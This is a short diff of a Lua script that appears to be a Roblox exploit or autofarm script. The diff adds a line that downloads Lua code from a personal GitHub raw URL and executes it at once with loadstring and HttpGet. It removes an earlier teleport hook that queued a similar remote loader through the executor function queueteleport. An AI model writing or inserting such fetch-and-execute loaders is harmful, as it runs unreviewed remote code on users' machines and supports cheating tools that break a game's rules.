@@ -11,17 +11,11 @@ local currentreceiptinfo = {
 	stomps = nil
 }
 -- v3
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/standzzz/test/main/customiy.lua"))()
 local stompstodo = 0
 local originalstomp = 0
 if not game:IsLoaded() then game.Loaded:Wait() end
-game.Players.LocalPlayer.OnTeleport:Connect(function(State)
-	if State == Enum.TeleportState.Started then
-		if  queueteleport then
-			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/standzzz/test/main/testing.lua'))()")
-		end
-	end
-end)
+
 
 local Stats = game:GetService("Stats")
 wait(5)
